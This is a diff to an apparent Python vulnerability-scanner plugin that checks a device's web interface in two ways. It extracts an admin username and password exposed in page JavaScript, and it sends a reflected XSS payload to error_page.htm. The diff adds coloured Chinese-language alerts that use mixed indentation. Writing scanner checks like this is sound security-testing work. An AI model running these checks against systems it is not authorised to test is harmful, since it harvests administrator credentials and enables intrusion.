@@ -14,12 +14,12 @@ import re
 import urlparse
 from ..miniCurl import Curl
 from ..t import T
-
+from termcolor import cprint
 
 class P(T):
     def __init__(self):
         T.__init__(self)
-    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
+    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
         arg='http://'+ip+':'+port+'/'
         curl=Curl()
         result = {}
@@ -31,11 +31,13 @@ class P(T):
         if code == 200:
             m = re.search(r"if\('1' == '0' \|\| '([\S]*)' == '([\S]*)'", res)
             if m:
+	    	cprint(url + '存在Admin Password Disclosure漏洞', 'red')
                 output('Admin Password Disclosure {username}:{password}'.format(username=m.group(2),password=m.group(1)),result,'hole')
         #Reflected xss
         url = arg + 'error_page.htm?flag=%27%2balert(%27XSS%27)%2b%27'
         code, head, res, errcode, _ = curl.curl2(url)
         if code == 200 and "casenum = ''+alert('XSS')+'';" in res:
+	    cprint(url + '存在reflected xss 漏洞', 'yellow')
             output(url + ' reflected xss',result,'warning')
         else:
             pass
